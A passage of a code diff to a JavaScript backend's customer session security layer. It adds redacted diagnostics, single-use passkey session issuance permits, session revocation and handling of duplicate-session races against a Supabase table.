   return customerSecurityBootstrapWrapRegisterResponse(req, res, function runPreviousHandler() {
-    return __diracCustomerSecurityRegisterBootstrapPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   });
-};
+}, "customerSecurityRegisterBootstrapWrapper");
 
 function customerSecurityRegisterBootstrapNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase();
@@ -4901,7 +5725,8 @@ async function customerSecurityEnsureSettingsRow(customerId) {
 
     if (alreadyMandatory) return { ok: true, created: false, enforced: false };
 
-    const patched = await supabaseFetch('/rest/v1/security_customer_settings?id=eq.' + encodeURIComponent(rows[0].id), {
+    const patched = await supabaseFetch('/rest/v1/security_customer_settings?id=eq.' + encodeURIComponent(rows[0].id)
+      + '&customer_id=eq.' + encodeURIComponent(customerId), {
       method: 'PATCH',
       auth: 'service',
       prefer: 'return=representation',
@@ -4926,22 +5751,477 @@ async function customerSecurityEnsureSettingsRow(customerId) {
   return { ok: true, created: true, enforced: true };
 }
 
-async function customerSecurityTouchCurrentSession(req, customerId) {
+const DIRAC_CUSTOMER_SESSION_STORE_DEBUG_V218 = 'dirac_customer_session_store_debug_v218';
+
+function customerSecuritySessionStoreDiagnosticV218(req, stage, result, extra = {}) {
+  const response = result && typeof result === 'object' ? result : {};
+  const data = response.data;
+  const status = Number(response.status || 0);
+  const cleanStage = String(stage || 'unknown').replace(/[^a-zA-Z0-9_]/g, '_').toUpperCase().slice(0, 80) || 'UNKNOWN';
+  const providerCodeRaw = data && typeof data === 'object'
+    ? (data.code || data.error_code || data.error || '')
+    : response.error || '';
+  const providerMessageRaw = data && typeof data === 'object'
+    ? (data.message || data.msg || data.error_description || '')
+    : typeof data === 'string' ? data : '';
+  const providerDetailsRaw = data && typeof data === 'object' ? (data.details || '') : '';
+  const providerHintRaw = data && typeof data === 'object' ? (data.hint || '') : '';
+  const safeProviderText = (value) => diracSecurityRedactDiagnosticV210(String(value || ''), 260)
+    .replace(/\b[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\b/gi, '[redacted-uuid]')
+    .replace(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g, '[redacted-ip]');
+  const providerCode = String(providerCodeRaw || '').replace(/[^a-zA-Z0-9_.-]/g, '_').slice(0, 120);
+  const responseRows = Array.isArray(data) ? data : [];
+  const responseHasId = Boolean(responseRows[0] && responseRows[0].id);
+  const condition = String(extra && extra.condition || '').trim().toLowerCase();
+
+  let diagnosticCode = 'SESSION_STORE_' + cleanStage + '_UNKNOWN_FAILURE';
+  if (condition === 'response_missing_id') diagnosticCode = 'SESSION_STORE_' + cleanStage + '_RESPONSE_MISSING_ID';
+  else if (condition === 'exception') diagnosticCode = 'SESSION_STORE_' + cleanStage + '_INTERNAL_EXCEPTION';
+  else if (condition === 'local_failure') diagnosticCode = 'SESSION_STORE_' + cleanStage + '_LOCAL_FAILURE';
+  else if (status === 504 || /timeout|abort/i.test(providerCode)) diagnosticCode = 'SESSION_STORE_' + cleanStage + '_TIMEOUT';
+  else if (status === 400) diagnosticCode = 'SESSION_STORE_' + cleanStage + '_DB_REJECTED_400';
+  else if (status === 401 || status === 403) diagnosticCode = 'SESSION_STORE_' + cleanStage + '_CREDENTIAL_OR_POLICY_REJECTED_' + status;
+  else if (status === 404) diagnosticCode = 'SESSION_STORE_' + cleanStage + '_TABLE_OR_SCHEMA_NOT_FOUND_404';
+  else if (status === 409) diagnosticCode = 'SESSION_STORE_' + cleanStage + '_CONSTRAINT_CONFLICT_409';
+  else if (status === 422) diagnosticCode = 'SESSION_STORE_' + cleanStage + '_VALIDATION_REJECTED_422';
+  else if (status >= 500) diagnosticCode = 'SESSION_STORE_' + cleanStage + '_UPSTREAM_FAILURE_' + status;
+  else if (status > 0) diagnosticCode = 'SESSION_STORE_' + cleanStage + '_HTTP_' + status;
+
+  let ctx = null;
+  try { ctx = diracCentralCurrentContextV149(); } catch (_) {}
+  const failurePoint = 'customerSecuritySessionStore.' + cleanStage.toLowerCase();
+  const diagnostic = Object.freeze({
+    patch: DIRAC_CUSTOMER_SESSION_STORE_DEBUG_V218,
+    diagnostic_code: diagnosticCode,
+    failure_point: failurePoint,
+    failure_id: (() => { try { return diracCentralFailureIdV211(ctx); } catch (_) { return 'DG-CENTRAL-UNAVAILABLE'; } })(),
+    table: 'security_customer_sessions',
+    method: String(extra && extra.method || (cleanStage.includes('CREATE') ? 'POST' : cleanStage.includes('UPDATE') ? 'PATCH' : 'GET')).toUpperCase().slice(0, 12),
+    reason: String(extra && extra.reason || 'session_store_failure').slice(0, 120),
+    upstream_status: status || 0,
+    provider_code: providerCode || undefined,
+    provider_message: providerMessageRaw ? safeProviderText(providerMessageRaw) : undefined,
+    provider_details: providerDetailsRaw ? safeProviderText(providerDetailsRaw) : undefined,
+    provider_hint: providerHintRaw ? safeProviderText(providerHintRaw) : undefined,
+    response_body_type: Array.isArray(data) ? 'array' : data === null ? 'null' : typeof data,
+    response_row_count: responseRows.length,
+    response_has_id: responseHasId,
+    elapsed_ms: Math.max(0, Number(extra && extra.elapsed_ms || 0)),
+    central_guard_passed: Boolean(req && req.__diracCentralSecurityGuardPassedV146 === true),
+    central_guard_fully_passed: Boolean(ctx && ctx.centralGuardFullyPassedV211 === true)
+  });
+
+  if (ctx) {
+    ctx.customerSessionStoreDebugV218 = diagnostic;
+    diracCentralEmitDebugV211(ctx, 'customer_session_store_failure', diagnostic);
+  } else {
+    try { console.error('[customer-session-store-debug-v218]', JSON.stringify(diagnostic)); } catch (_) {}
+  }
+  return diagnostic;
+}
+
+const DIRAC_CUSTOMER_SESSION_DECISION_DEBUG_V219 = 'dirac_customer_session_decision_debug_v219';
+
+function customerSecurityShortDigestV219(value) {
+  const text = String(value || '');
+  if (!text) return '';
+  return customerSecuritySha256('dirac-session-debug-v219|' + text).slice(0, 16);
+}
+
+function customerSecuritySessionFingerprintSelectionV219(req) {
   try {
+    const cookies = parseCookies(req);
+    const headerToken = getBearerToken(req);
+    const accessCookieTokens = readCookieTokenCandidates(cookies, ACCESS_COOKIE);
+    const headerRefreshToken = String((req && req.headers && (req.headers['x-domain-refresh'] || req.headers['x-refresh-token'])) || '').trim();
+    const refreshCookieTokens = readCookieTokenCandidates(cookies, REFRESH_COOKIE);
+    const signedCookieTokens = readCookieTokenCandidates(cookies, DOMAIN_SIGNED_SESSION_COOKIE);
+    const candidates = [
+      { source: 'bearer_header', value: headerToken },
+      ...accessCookieTokens.map((value, index) => ({ source: 'access_cookie_' + index, value })),
+      { source: 'refresh_header', value: headerRefreshToken },
+      ...refreshCookieTokens.map((value, index) => ({ source: 'refresh_cookie_' + index, value })),
+      ...signedCookieTokens.map((value, index) => ({ source: 'signed_session_cookie_' + index, value }))
+    ];
+    const selected = candidates.find((item) => String(item && item.value || '').trim()) || null;
+    return Object.freeze({
+      source: selected ? selected.source : 'missing',
+      token_digest: selected ? customerSecurityShortDigestV219(selected.value) : '',
+      bearer_present: Boolean(headerToken),
+      access_material_count: accessCookieTokens.filter(Boolean).length,
+      refresh_header_present: Boolean(headerRefreshToken),
+      refresh_material_count: refreshCookieTokens.filter(Boolean).length,
+      signed_material_count: signedCookieTokens.filter(Boolean).length
+    });
+  } catch (_) {
+    return Object.freeze({
+      source: 'debug_selection_unavailable',
+      token_digest: '',
+      bearer_present: false,
+      access_material_count: 0,
+      refresh_header_present: false,
+      refresh_material_count: 0,
+      signed_material_count: 0
+    });
+  }
+}
+
+function customerSecuritySetAuthDebugV219(req, details) {
+  if (!req || typeof req !== 'object') return null;
+  const safe = Object.freeze({
+    source: String(details && details.source || 'unknown').replace(/[^a-zA-Z0-9_.-]/g, '_').slice(0, 80),
+    path: String(details && details.path || 'unknown').replace(/[^a-zA-Z0-9_.-]/g, '_').slice(0, 80),
+    token_digest: String(details && details.token_digest || '').replace(/[^a-f0-9]/gi, '').slice(0, 16),
+    access_candidate_count: Math.max(0, Math.min(20, Number(details && details.access_candidate_count || 0))),
+    refresh_candidate_count: Math.max(0, Math.min(20, Number(details && details.refresh_candidate_count || 0))),
+    frontend_headers_accepted: Boolean(details && details.frontend_headers_accepted),
+    refreshed: Boolean(details && details.refreshed),
+    authenticated: Boolean(details && details.authenticated)
+  });
+  try { Object.defineProperty(req, '__diracCustomerAuthDebugV219', { value: safe, writable: false, enumerable: false, configurable: true }); }
+  catch (_) { try { req.__diracCustomerAuthDebugV219 = safe; } catch (_) {} }
+  return safe;
+}
+
+function customerSecurityRevokeReasonCodeV219(value) {
+  const clean = String(value || '').trim().toLowerCase();
+  if (!clean) return 'none';
+  if (/idle/.test(clean)) return 'idle_timeout';
+  if (/expir/.test(clean)) return 'expired';
+  if (/logout|signout|sign_out/.test(clean)) return 'logout';
+  if (/replac|rotat|supersed/.test(clean)) return 'session_replaced';
+  if (/manual|admin/.test(clean)) return 'manual_revoke';
+  if (/security|threat|risk|ban|attack/.test(clean)) return 'security_revoke';
+  return 'other';
+}
+
+function customerSecuritySessionDecisionDetailsV219(details) {
+  const source = details && typeof details === 'object' ? details : {};
+  const out = Object.create(null);
+  const stringKeys = [
+    'decision', 'reason', 'result', 'auth_source', 'auth_path', 'fingerprint_source',
+    'mfa_code', 'mfa_source', 'session_status', 'revoke_reason_code', 'database_operation',
+    'diagnostic_code', 'failure_point', 'provider_code'
+  ];
+  const booleanKeys = [
+    'authenticated', 'refreshed', 'frontend_headers_accepted', 'fingerprint_matches_authenticated_token',
+    'row_found', 'row_has_id', 'revoked', 'expired', 'idle_expired', 'has_last_seen',
+    'clear_cookies', 'guard_passed', 'guard_fully_passed', 'context_request_match',
+    'bearer_present', 'refresh_header_present', 'touch_ok', 'session_id_match'
+  ];
+  const numberKeys = [
+    'access_candidate_count', 'refresh_candidate_count', 'access_material_count', 'refresh_material_count',
+    'signed_material_count', 'row_count', 'idle_ms', 'idle_timeout_ms', 'expires_in_ms',
+    'last_seen_age_ms', 'upstream_status', 'elapsed_ms'
+  ];
+  const digestKeys = ['auth_token_digest', 'fingerprint_token_digest', 'customer_digest', 'session_id_digest'];
+
+  for (const key of stringKeys) {
+    if (source[key] === undefined || source[key] === null || source[key] === '') continue;
+    out[key] = String(source[key]).replace(/[^a-zA-Z0-9_.:-]/g, '_').slice(0, 160);
+  }
+  for (const key of booleanKeys) {
+    if (source[key] === undefined || source[key] === null) continue;
+    out[key] = Boolean(source[key]);
+  }
+  for (const key of numberKeys) {
+    if (source[key] === undefined || source[key] === null || source[key] === '') continue;
+    const number = Number(source[key]);
+    if (Number.isFinite(number)) out[key] = Math.max(-31536000000, Math.min(31536000000, Math.trunc(number)));
+  }
+  for (const key of digestKeys) {
+    const digest = String(source[key] || '').replace(/[^a-f0-9]/gi, '').slice(0, 16);
+    if (digest) out[key] = digest;
+  }
+  return out;
+}
+
+function customerSecuritySessionDecisionDebugV219(req, phase, details = {}) {
+  try {
+    let ctx = null;
+    try { ctx = diracCentralCurrentContextV149(); } catch (_) {}
+    const reqRequestId = String(req && req.__diracCentralRequestIdV211 || '').slice(0, 64);
+    const ctxRequestId = String(ctx && ctx.requestId || '').slice(0, 64);
+    const authDebug = req && req.__diracCustomerAuthDebugV219 && typeof req.__diracCustomerAuthDebugV219 === 'object'
+      ? req.__diracCustomerAuthDebugV219
+      : null;
+    const fingerprintDebug = customerSecuritySessionFingerprintSelectionV219(req);
+    const payload = customerSecuritySessionDecisionDetailsV219({
+      ...details,
+      auth_source: details.auth_source || authDebug && authDebug.source || 'unknown',
+      auth_path: details.auth_path || authDebug && authDebug.path || 'unknown',
+      auth_token_digest: details.auth_token_digest || authDebug && authDebug.token_digest || '',
+      fingerprint_source: details.fingerprint_source || fingerprintDebug.source,
+      fingerprint_token_digest: details.fingerprint_token_digest || fingerprintDebug.token_digest,
+      authenticated: details.authenticated !== undefined ? details.authenticated : Boolean(authDebug && authDebug.authenticated),
+      refreshed: details.refreshed !== undefined ? details.refreshed : Boolean(authDebug && authDebug.refreshed),
+      frontend_headers_accepted: details.frontend_headers_accepted !== undefined
+        ? details.frontend_headers_accepted
+        : Boolean(authDebug && authDebug.frontend_headers_accepted),
+      access_candidate_count: details.access_candidate_count !== undefined
+        ? details.access_candidate_count
+        : authDebug && authDebug.access_candidate_count,
+      refresh_candidate_count: details.refresh_candidate_count !== undefined
+        ? details.refresh_candidate_count
+        : authDebug && authDebug.refresh_candidate_count,
+      access_material_count: fingerprintDebug.access_material_count,
+      refresh_material_count: fingerprintDebug.refresh_material_count,
+      signed_material_count: fingerprintDebug.signed_material_count,
+      bearer_present: fingerprintDebug.bearer_present,
+      refresh_header_present: fingerprintDebug.refresh_header_present,
+      fingerprint_matches_authenticated_token: Boolean(
+        authDebug && authDebug.token_digest && fingerprintDebug.token_digest
+        && safeEqual(String(authDebug.token_digest), String(fingerprintDebug.token_digest))
+      ),
+      guard_passed: Boolean(req && req.__diracCentralSecurityGuardPassedV146 === true),
+      guard_fully_passed: Boolean(ctx && ctx.centralGuardFullyPassedV211 === true),
+      context_request_match: Boolean(reqRequestId && ctxRequestId && safeEqual(reqRequestId, ctxRequestId))
+    });
+    const cleanPhase = String(phase || 'unknown').replace(/[^a-zA-Z0-9_.-]/g, '_').slice(0, 100);
+    const diagnostic = Object.freeze({
+      patch: DIRAC_CUSTOMER_SESSION_DECISION_DEBUG_V219,
+      phase: cleanPhase,
+      ...payload
+    });
+
+    let trace = req && Array.isArray(req.__diracCustomerSessionDecisionTraceV219)
+      ? req.__diracCustomerSessionDecisionTraceV219
+      : null;
+    if (!trace) {
+      trace = [];
+      if (req && typeof req === 'object') {
+        try { Object.defineProperty(req, '__diracCustomerSessionDecisionTraceV219', { value: trace, writable: false, enumerable: false, configurable: false }); } catch (_) {}
+      }
+    }
+    trace.push(diagnostic);
+    if (trace.length > 24) trace.shift();
+    if (ctx) ctx.customerSessionDecisionTraceV219 = trace;
+
+    const terminal = /^(?:auth\.rejected|mfa\.rejected|protected_session\.(?:exception|rejected)|dashboard_response\.200|session_touch\.(?:update_failed|create_failed|create_missing_id))$/.test(cleanPhase);
+    if (terminal && ctx) {
+      diracCentralEmitDebugV211(ctx, 'customer_session_decision_terminal', {
+        patch: DIRAC_CUSTOMER_SESSION_DECISION_DEBUG_V219,
+        terminal_phase: cleanPhase,
+        trace_count: trace.length,
+        session_trace: trace.slice()
+      });
+    } else if (terminal) {
+      try { console.info('[customer-session-decision-v219]', JSON.stringify({ terminal_phase: cleanPhase, trace_count: trace.length, session_trace: trace })); } catch (_) {}
+    }
+    return diagnostic;
+  } catch (_) {
+    return null;
+  }
+}
+
+function customerSecurityCreatePasskeySessionIssuancePermitV235(req, customerId, securityEpoch, credentialId) {
+  const cleanCustomerId = String(customerId || '').trim();
+  const epoch = Number(securityEpoch || 0);
+  const credentialHash = crypto.createHash('sha256').update(String(credentialId || '')).digest('hex');
+  if (!req || typeof req !== 'object'
+      || !customerSecurityLooksLikeUuid(cleanCustomerId)
+      || !Number.isSafeInteger(epoch) || epoch < 1
+      || !/^[a-f0-9]{64}$/.test(credentialHash)) return null;
+
+  const permit = Object.freeze({
+    version: 'dirac-passkey-session-issuance-v235',
+    customerId: cleanCustomerId,
+    securityEpoch: epoch,
+    credentialHash,
+    issuedAtMs: Date.now(),
+    nonce: crypto.randomBytes(32).toString('base64url')
+  });
+  try {
+    Object.defineProperty(req, '__diracPasskeySessionIssuancePermitV235', {
+      value: permit,
+      enumerable: false,
+      writable: false,
+      configurable: false
+    });
+    return permit;
+  } catch (_) {
+    return null;
+  }
+}
+
+function customerSecurityValidatePasskeySessionIssuancePermitV235(req, customerId, permit) {
+  const sealed = req && req.__diracPasskeySessionIssuancePermitV235;
+  if (!sealed || permit !== sealed || !Object.isFrozen(sealed)
+      || req.__diracPasskeySessionIssuancePermitConsumedV235) return null;
+  if (sealed.version !== 'dirac-passkey-session-issuance-v235'
+      || !safeEqual(String(sealed.customerId || ''), String(customerId || ''))
+      || !Number.isSafeInteger(Number(sealed.securityEpoch))
+      || Number(sealed.securityEpoch) < 1
+      || !/^[a-f0-9]{64}$/.test(String(sealed.credentialHash || ''))
+      || !/^[A-Za-z0-9_-]{43}$/.test(String(sealed.nonce || ''))
+      || !Number.isSafeInteger(Number(sealed.issuedAtMs))
+      || Number(sealed.issuedAtMs) > Date.now() + 5000
+      || Date.now() - Number(sealed.issuedAtMs) > 30_000) return null;
+  try {
+    Object.defineProperty(req, '__diracPasskeySessionIssuancePermitConsumedV235', {
+      value: sealed.nonce,
+      enumerable: false,
+      writable: false,
+      configurable: false
+    });
+  } catch (_) {
+    return null;
+  }
+  return sealed;
+}
+
+async function customerSecurityRevokeIssuedSessionV235(req, customerId, sessionId, reason) {
+  const cleanCustomerId = String(customerId || '').trim();
+  const cleanSessionId = String(sessionId || '').trim();
+  const fingerprint = customerSecurityBuildSessionFingerprint(req, cleanCustomerId);
+  if (!customerSecurityLooksLikeUuid(cleanCustomerId)
+      || !customerSecurityLooksLikeUuid(cleanSessionId)
+      || !fingerprint || !fingerprint.session_token_hash) return false;
+
+  const readPath = '/rest/v1/security_customer_sessions?select=' +
+    encodeURIComponent('id,customer_id,session_token_hash,status,revoked_at') +
+    '&customer_id=eq.' + encodeURIComponent(cleanCustomerId) +
+    '&session_token_hash=eq.' + encodeURIComponent(fingerprint.session_token_hash) +
+    '&limit=2';
+  const readResult = await supabaseFetch(readPath, {
+    method: 'GET',
+    auth: 'service'
+  }).catch(() => null);
+  const rows = readResult && readResult.ok === true && Array.isArray(readResult.data)
+    ? readResult.data
+    : [];
+  if (rows.length !== 1) return false;
+
+  const row = rows[0];
+  const boundSessionId = String(row && row.id || '').trim();
+  if (!customerSecurityLooksLikeUuid(boundSessionId)
+      || !safeEqual(boundSessionId, cleanSessionId)
+      || !safeEqual(String(row && row.customer_id || ''), cleanCustomerId)
+      || !safeEqual(String(row && row.session_token_hash || ''), String(fingerprint.session_token_hash))
+      || String(row && row.status || '').trim().toLowerCase() !== 'active'
+      || Boolean(row && row.revoked_at)) return false;
+
+  const result = await supabaseFetch('/rest/v1/security_customer_sessions?id=eq.' + encodeURIComponent(boundSessionId)
+    + '&customer_id=eq.' + encodeURIComponent(cleanCustomerId)
+    + '&session_token_hash=eq.' + encodeURIComponent(fingerprint.session_token_hash), {
+    method: 'PATCH',
+    auth: 'service',
+    prefer: 'return=minimal',
+    body: {
+      status: 'revoked',
+      revoked_at: new Date().toISOString(),
+      revoke_reason: String(reason || 'passkey_session_issuance_failed').slice(0, 80)
+    }
+  }).catch(() => null);
+  return Boolean(result && result.ok === true);
+}
+
+async function customerSecurityTouchCurrentSession(req, customerId, verifiedExistingSession, issuanceContext) {
+  let activeStage = 'fingerprint';
+  try {
+    const issuancePermit = customerSecurityValidatePasskeySessionIssuancePermitV235(
+      req,
+      customerId,
+      issuanceContext
+    );
     const fingerprint = customerSecurityBuildSessionFingerprint(req, customerId);
-    if (!fingerprint || !fingerprint.session_token_hash) return { ok: false, reason: 'missing_session_fingerprint' };
+    if (!fingerprint || !fingerprint.session_token_hash) {
+      const diagnostic = customerSecuritySessionStoreDiagnosticV218(req, 'fingerprint', {
+        ok: false,
+        status: 0,
+        data: { code: 'SESSION_FINGERPRINT_MISSING', message: 'Session fingerprint tidak tersedia.' }
+      }, {
+        reason: 'missing_session_fingerprint',
+        condition: 'local_failure',
+        method: 'LOCAL'
+      });
+      return {
+        ok: false,
+        reason: 'missing_session_fingerprint',
+        diagnostic_code: diagnostic.diagnostic_code,
+        failure_point: diagnostic.failure_point,
+        upstream_status: diagnostic.upstream_status,
+        provider_code: diagnostic.provider_code,
+        failure_id: diagnostic.failure_id
+      };
+    }
 
-    const path = '/rest/v1/security_customer_sessions?select=id,status&customer_id=eq.' +
-      encodeURIComponent(customerId) +
-      '&session_token_hash=eq.' +
-      encodeURIComponent(fingerprint.session_token_hash) +
-      '&limit=1';
+    const verifiedRow = verifiedExistingSession && typeof verifiedExistingSession === 'object'
+      && customerSecurityLooksLikeUuid(String(verifiedExistingSession.id || '').trim())
+      && safeEqual(String(verifiedExistingSession.customer_id || ''), String(customerId || ''))
+      && safeEqual(String(verifiedExistingSession.session_token_hash || ''), String(fingerprint.session_token_hash || ''))
+      && String(verifiedExistingSession.status || '').trim().toLowerCase() === 'active'
+      && Number.isSafeInteger(Number(verifiedExistingSession.security_epoch))
+      && Number(verifiedExistingSession.security_epoch) >= 1
+      ? {
+          id: String(verifiedExistingSession.id).trim(),
+          status: 'active',
+          security_epoch: Number(verifiedExistingSession.security_epoch)
+        }
+      : null;
 
-    const existing = await supabaseFetch(path, { method: 'GET', auth: 'service' });
-    if (!existing.ok) return { ok: false, reason: 'session_read_failed', status: existing.status };
+    let rows = [];
+    let databaseOperation = 'VERIFIED_REUSE';
+    if (verifiedRow) {
+      rows = [verifiedRow];
+    } else {
+      const path = '/rest/v1/security_customer_sessions?select=id,status,security_epoch,revoked_at,revoke_reason&customer_id=eq.' +
+        encodeURIComponent(customerId) +
+        '&session_token_hash=eq.' +
+        encodeURIComponent(fingerprint.session_token_hash) +
+        '&limit=1';
 
-    const rows = Array.isArray(existing.data) ? existing.data : [];
+      activeStage = 'read';
+      const readStartedAtMs = Date.now();
+      const existing = await supabaseFetch(path, { method: 'GET', auth: 'service' });
+      if (!existing.ok) {
+        const diagnostic = customerSecuritySessionStoreDiagnosticV218(req, 'read', existing, {
+          elapsed_ms: Date.now() - readStartedAtMs,
+          reason: 'session_read_failed'
+        });
+        return {
+          ok: false,
+          reason: 'session_read_failed',
+          status: existing.status,
+          diagnostic_code: diagnostic.diagnostic_code,
+          failure_point: diagnostic.failure_point,
+          upstream_status: diagnostic.upstream_status,
+          provider_code: diagnostic.provider_code,
+          failure_id: diagnostic.failure_id
+        };
+      }
+
+      rows = Array.isArray(existing.data) ? existing.data : [];
+      databaseOperation = 'GET';
+    }
+
     const now = new Date().toISOString();
+    customerSecuritySessionDecisionDebugV219(req, 'session_touch.read', {
+      decision: rows.length && rows[0] && rows[0].id ? 'update_existing_row' : 'create_missing_row',
+      database_operation: databaseOperation,
+      row_count: rows.length,
+      row_found: Boolean(rows.length),
+      row_has_id: Boolean(rows[0] && rows[0].id),
+      customer_digest: customerSecurityShortDigestV219(customerId),
+      session_id_digest: customerSecurityShortDigestV219(rows[0] && rows[0].id || ''),
+      session_status: String(rows[0] && rows[0].status || '')
+    });
+
+    const currentRow = rows[0] && rows[0].id ? rows[0] : null;
+    const currentStatus = String(currentRow && currentRow.status || '').trim().toLowerCase();
+    if (!currentRow && !issuancePermit) {
+      return { ok: false, reason: 'session_creation_not_authorized', status: 401 };
+    }
+    if (currentRow && currentStatus !== 'active' && !issuancePermit) {
+      return { ok: false, reason: 'session_reactivation_not_authorized', status: 401 };
+    }
+
+    const resolvedSecurityEpoch = issuancePermit
+      ? Number(issuancePermit.securityEpoch)
+      : Number(currentRow && currentRow.security_epoch || verifiedRow && verifiedRow.security_epoch || 0);
+    if (!Number.isSafeInteger(resolvedSecurityEpoch) || resolvedSecurityEpoch < 1) {
+      return { ok: false, reason: 'session_security_epoch_invalid', status: 401 };
+    }
 
     const updateBody = {
       device_id: fingerprint.device_id,
@@ -4954,9 +6234,17 @@ async function customerSecurityTouchCurrentSession(req, customerId) {
       last_seen_at: now,
       expires_at: fingerprint.expires_at
     };
+    if (issuancePermit) {
+      updateBody.revoked_at = null;
+      updateBody.revoke_reason = null;
+    }
 
     if (rows.length && rows[0] && rows[0].id) {
-      const patched = await supabaseFetch('/rest/v1/security_customer_sessions?id=eq.' + encodeURIComponent(rows[0].id) +
+      activeStage = 'update';
+      const updateStartedAtMs = Date.now();
+      const patched = await supabaseFetch('/rest/v1/security_customer_sessions?select=' +
+        encodeURIComponent('id,security_epoch') +
+        '&id=eq.' + encodeURIComponent(rows[0].id) +
         '&customer_id=eq.' + encodeURIComponent(customerId), {
         method: 'PATCH',
         auth: 'service',
@@ -4964,11 +6252,49 @@ async function customerSecurityTouchCurrentSession(req, customerId) {
         body: updateBody
       });
 
-      if (!patched.ok) return { ok: false, reason: 'session_update_failed', status: patched.status };
-      return { ok: true, created: false, session_id: rows[0].id };
+      if (!patched.ok) {
+        customerSecuritySessionDecisionDebugV219(req, 'session_touch.update_failed', {
+          decision: 'return_failure',
+          database_operation: 'PATCH',
+          upstream_status: patched.status,
+          customer_digest: customerSecurityShortDigestV219(customerId),
+          session_id_digest: customerSecurityShortDigestV219(rows[0].id)
+        });
+        const diagnostic = customerSecuritySessionStoreDiagnosticV218(req, 'update', patched, {
+          elapsed_ms: Date.now() - updateStartedAtMs,
+          reason: 'session_update_failed'
+        });
+        return {
+          ok: false,
+          reason: 'session_update_failed',
+          status: patched.status,
+          diagnostic_code: diagnostic.diagnostic_code,
+          failure_point: diagnostic.failure_point,
+          upstream_status: diagnostic.upstream_status,
+          provider_code: diagnostic.provider_code,
+          failure_id: diagnostic.failure_id
+        };
+      }
+      const patchedRows = Array.isArray(patched.data) ? patched.data : [];
+      const patchedRow = patchedRows.length === 1 ? patchedRows[0] : null;
+      if (!patchedRow || String(patchedRow.id || '') !== String(rows[0].id)
+          || Number(patchedRow.security_epoch || 0) !== resolvedSecurityEpoch) {
+        return { ok: false, reason: 'session_update_epoch_postcondition_failed', status: 409 };
+      }
+      customerSecuritySessionDecisionDebugV219(req, 'session_touch.update_succeeded', {
+        decision: 'return_success',
+        database_operation: 'PATCH',
+        touch_ok: true,
+        customer_digest: customerSecurityShortDigestV219(customerId),
+        session_id_digest: customerSecurityShortDigestV219(rows[0].id)
+      });
+      return { ok: true, created: false, session_id: rows[0].id, security_epoch: resolvedSecurityEpoch };
     }
 
-    const created = await supabaseFetch('/rest/v1/security_customer_sessions', {
+    activeStage = 'create';
+    const createStartedAtMs = Date.now();
+    const created = await supabaseFetch('/rest/v1/security_customer_sessions?select=' +
+      encodeURIComponent('id,security_epoch'), {
       method: 'POST',
       auth: 'service',
       prefer: 'return=representation',
@@ -4977,22 +6303,201 @@ async function customerSecurityTouchCurrentSession(req, customerId) {
         session_token_hash: fingerprint.session_token_hash,
         trusted_device: false,
         metadata: {
-          source: 'customer_security_overview',
-          auto_detected: true
+          source: issuancePermit ? 'passkey_verified_session_issuance_v235' : 'customer_security_overview',
+          auto_detected: !issuancePermit,
+          credential_hash: issuancePermit ? issuancePermit.credentialHash : null
         },
         ...updateBody
       }]
     });
 
-    if (!created.ok) return { ok: false, reason: 'session_create_failed', status: created.status };
+    if (!created.ok) {
+      const createProviderData = created.data && typeof created.data === 'object' ? created.data : {};
+      const createProviderCode = String(createProviderData.code || createProviderData.error_code || '');
+      const createProviderConflictText = [createProviderData.message, createProviderData.details]
+        .map((value) => String(value || ''))
+        .join(' ');
+      const isSessionTokenHashRace = Number(created.status || 0) === 409
+        && createProviderCode === '23505'
+        && /security_customer_sessions_token_hash_unique/i.test(createProviderConflictText);
 
+      if (isSessionTokenHashRace) {
+        activeStage = 'create_conflict_read';
+        const conflictReadStartedAtMs = Date.now();
+        const conflictSelect = 'id,customer_id,session_token_hash,status,revoked_at,expires_at,device_id,security_epoch';
+        const conflictReadPath = '/rest/v1/security_customer_sessions?select=' +
+          encodeURIComponent(conflictSelect) +
+          '&customer_id=eq.' + encodeURIComponent(customerId) +
+          '&session_token_hash=eq.' + encodeURIComponent(fingerprint.session_token_hash) +
+          '&limit=1';
+        const conflictRead = await supabaseFetch(conflictReadPath, { method: 'GET', auth: 'service' });
+
+        if (!conflictRead.ok) {
+          customerSecuritySessionDecisionDebugV219(req, 'session_touch.create_conflict_read_failed', {
+            decision: 'return_failure',
+            database_operation: 'GET',
+            upstream_status: conflictRead.status,
+            customer_digest: customerSecurityShortDigestV219(customerId)
+          });
+          const diagnostic = customerSecuritySessionStoreDiagnosticV218(req, 'create_conflict_read', conflictRead, {
+            elapsed_ms: Date.now() - conflictReadStartedAtMs,
+            reason: 'session_create_conflict_read_failed'
+          });
+          return {
+            ok: false,
+            reason: 'session_create_conflict_read_failed',
+            status: conflictRead.status,
+            diagnostic_code: diagnostic.diagnostic_code,
+            failure_point: diagnostic.failure_point,
+            upstream_status: diagnostic.upstream_status,
+            provider_code: diagnostic.provider_code,
+            failure_id: diagnostic.failure_id
+          };
+        }
+
+        const conflictRows = Array.isArray(conflictRead.data) ? conflictRead.data : [];
+        const conflictRow = conflictRows[0] || null;
+        const conflictExpiresAtMs = Date.parse(String(conflictRow && conflictRow.expires_at || ''));
+        const conflictVerified = Boolean(conflictRow && conflictRow.id)
+          && safeEqual(String(conflictRow.customer_id || ''), String(customerId))
+          && safeEqual(String(conflictRow.session_token_hash || ''), String(fingerprint.session_token_hash))
+          && safeEqual(String(conflictRow.device_id || ''), String(fingerprint.device_id || ''))
+          && String(conflictRow.status || '').trim().toLowerCase() === 'active'
+          && !conflictRow.revoked_at
+          && Number.isFinite(conflictExpiresAtMs)
+          && conflictExpiresAtMs > Date.now()
+          && Number(conflictRow.security_epoch || 0) === resolvedSecurityEpoch;
+
+        if (conflictVerified) {
+          customerSecuritySessionDecisionDebugV219(req, 'session_touch.create_conflict_recovered', {
+            decision: 'return_success',
+            database_operation: 'GET',
+            touch_ok: true,
+            row_found: true,
+            row_has_id: true,
+            session_status: String(conflictRow.status || ''),
+            customer_digest: customerSecurityShortDigestV219(customerId),
+            session_id_digest: customerSecurityShortDigestV219(conflictRow.id)
+          });
+          return { ok: true, created: false, session_id: conflictRow.id, security_epoch: resolvedSecurityEpoch };
+        }
+
+        customerSecuritySessionDecisionDebugV219(req, 'session_touch.create_conflict_rejected', {
+          decision: 'return_failure',
+          database_operation: 'GET',
+          row_found: Boolean(conflictRow),
+          row_has_id: Boolean(conflictRow && conflictRow.id),
+          session_status: String(conflictRow && conflictRow.status || ''),
